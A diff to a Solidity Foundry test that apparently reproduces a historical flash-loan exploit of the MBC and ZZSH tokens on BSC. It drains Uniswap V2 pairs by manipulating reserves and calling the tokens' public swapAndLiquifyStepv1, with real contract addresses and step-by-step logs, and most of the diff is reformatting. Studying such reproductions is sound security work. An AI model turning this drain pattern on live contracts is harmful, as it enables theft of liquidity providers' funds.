@@ -9,9 +9,9 @@ import {IWETH9} from "../../interfaces/IWETH9.sol";
 
 import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";
 
-
 interface IDppOracle {
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data) external;
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data)
+        external;
 }
 
 interface ILiqToken is IERC20 {
@@ -20,7 +20,7 @@ interface ILiqToken is IERC20 {
 
 contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
     IDppOracle internal dppOracle = IDppOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
-    
+
     IERC20 internal usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
     ILiqToken internal mbc = ILiqToken(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
     ILiqToken internal zzsh = ILiqToken(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6);
@@ -32,8 +32,8 @@ contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
 
     IUniswapV2Pair[] internal pairs = [pairUsdtMbc, pairUsdtZzsh];
 
-    function setUp() external{
-        cheat.createSelectFork('bsc', 23474460);
+    function setUp() external {
+        cheat.createSelectFork(vm.envString("RPC_URL"), 23_474_460);
         cheat.deal(address(this), 0);
 
         addTokenToTracker(address(usdt));
@@ -47,14 +47,14 @@ contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
         updateBalanceTracker(address(zzsh));
     }
 
-    function test_attack() external  {
-        console.log('===== STEP 1: REQUEST FLASHLOAN =====');
-        logBalancesWithLabel('Attacker Contract', address(this));
+    function test_attack() external {
+        console.log("===== STEP 1: REQUEST FLASHLOAN =====");
+        logBalancesWithLabel("Attacker Contract", address(this));
         uint256 balanceUsdtBefore = usdt.balanceOf(address(this));
         uint256 balanceMBCBefore = mbc.balanceOf(address(this));
         uint256 balanceZZSHBefore = zzsh.balanceOf(address(this));
 
-        dppOracle.flashLoan(0, usdt.balanceOf(address(dppOracle)), address(this), hex'30');
+        dppOracle.flashLoan(0, usdt.balanceOf(address(dppOracle)), address(this), hex"30");
 
         uint256 balanceUsdtAfter = usdt.balanceOf(address(this));
         uint256 balanceMBCAfter = mbc.balanceOf(address(this));
@@ -65,18 +65,18 @@ contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
         assertGe(balanceMBCAfter, balanceMBCBefore);
     }
 
-    function DPPFlashLoanCall(address sender, uint256 amount1, uint256 amount2, bytes memory ) external {
-        require(msg.sender == address(dppOracle), 'Only oracle');
-        require(sender == address(this), 'Only requested by this');
+    function DPPFlashLoanCall(address sender, uint256 amount1, uint256 amount2, bytes memory) external {
+        require(msg.sender == address(dppOracle), "Only oracle");
+        require(sender == address(this), "Only requested by this");
 
         uint256 usdtReceived = amount1 > 0 ? amount1 : amount2;
 
-        console.log('===== STEP 2: FLASHLOAN RECEIVED =====');
-        logBalancesWithLabel('Attacker Contract', address(this));
-        
-        console.log('===== STEP 3: START MANIPULATION =====');
+        console.log("===== STEP 2: FLASHLOAN RECEIVED =====");
+        logBalancesWithLabel("Attacker Contract", address(this));
+
+        console.log("===== STEP 3: START MANIPULATION =====");
         uint256 lenTokens = liqTokens.length;
-        for(uint256 i = 0; i< lenTokens; i++){
+        for (uint256 i = 0; i < lenTokens; i++) {
             IUniswapV2Pair curPair = pairs[i];
             ILiqToken curLiqToken = liqTokens[i];
 
@@ -84,60 +84,60 @@ contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
             // A note for those not-familiar, the swap in uniswap expects
             // a transfer to it _before_ and does not use permit/allowance
             // https://docs.uniswap.org/contracts/v2/concepts/core-concepts/swaps
-            usdt.transfer(address(curPair), 150000 ether);
+            usdt.transfer(address(curPair), 150_000 ether);
 
             // For the first part, we drain MBC tokens
-            (uint112 reserve0, uint112 reserve1, ) = curPair.getReserves();
+            (uint112 reserve0, uint112 reserve1,) = curPair.getReserves();
 
-            if(i == 0) {
-                console.log('===== MBC SWAP =====');
-                curPair.swap(reserve0 * 930 / 1000, 0, address(this), '');
+            if (i == 0) {
+                console.log("===== MBC SWAP =====");
+                curPair.swap(reserve0 * 930 / 1000, 0, address(this), "");
             }
 
-            if(i == 1) {
-                console.log('===== ZZSH SWAP =====');
-                curPair.swap(0, reserve1 * 918 / 1000, address(this), '');
+            if (i == 1) {
+                console.log("===== ZZSH SWAP =====");
+                curPair.swap(0, reserve1 * 918 / 1000, address(this), "");
             }
 
-            logBalancesWithLabel('Attacker Contract', address(this));
+            logBalancesWithLabel("Attacker Contract", address(this));
             logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
-            logBalancesWithLabel('Current Pair', address(curPair));
-            
-            console.log('===== LIQ TOKEN SWAP AND LIQUIFY =====');
+            logBalancesWithLabel("Current Pair", address(curPair));
+
+            console.log("===== LIQ TOKEN SWAP AND LIQUIFY =====");
             curLiqToken.swapAndLiquifyStepv1();
 
-            logBalancesWithLabel('Attacker Contract', address(this));
+            logBalancesWithLabel("Attacker Contract", address(this));
             logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
-            logBalancesWithLabel('Current Pair', address(curPair));
+            logBalancesWithLabel("Current Pair", address(curPair));
 
             curPair.sync();
 
-            console.log('===== TRANSFER USDT and LIQ TOKEN TO PAIR =====');
+            console.log("===== TRANSFER USDT and LIQ TOKEN TO PAIR =====");
             usdt.transfer(address(curPair), 1001);
             curLiqToken.transfer(address(curPair), curLiqToken.balanceOf(address(this)));
-            logBalancesWithLabel('Attacker Contract', address(this));
+            logBalancesWithLabel("Attacker Contract", address(this));
             logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
-            logBalancesWithLabel('Current Pair', address(curPair));
+            logBalancesWithLabel("Current Pair", address(curPair));
 
-            console.log('===== DRAIN PAIR =====');
+            console.log("===== DRAIN PAIR =====");
             uint256 amountToDrain;
 
-            if(i == 0) {
+            if (i == 0) {
                 amountToDrain = usdt.balanceOf(address(curPair)) * 912 / 1000; // ninedec
-                curPair.swap(0, amountToDrain, address(this), '');
+                curPair.swap(0, amountToDrain, address(this), "");
             }
 
-            if(i == 1) {
+            if (i == 1) {
                 amountToDrain = usdt.balanceOf(address(curPair)) * 910 / 1000;
-                curPair.swap(amountToDrain, 0, address(this), '');
+                curPair.swap(amountToDrain, 0, address(this), "");
             }
 
-            logBalancesWithLabel('Attacker Contract', address(this));
+            logBalancesWithLabel("Attacker Contract", address(this));
             logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
-            logBalancesWithLabel('Current Pair', address(curPair));
+            logBalancesWithLabel("Current Pair", address(curPair));
         }
-        console.log('===== REPAYING LOAN =====');
+        console.log("===== REPAYING LOAN =====");
         require(usdt.transfer(address(dppOracle), usdtReceived));
-        logBalancesWithLabel('Attacker Contract', address(this));       
+        logBalancesWithLabel("Attacker Contract", address(this));
     }
 }
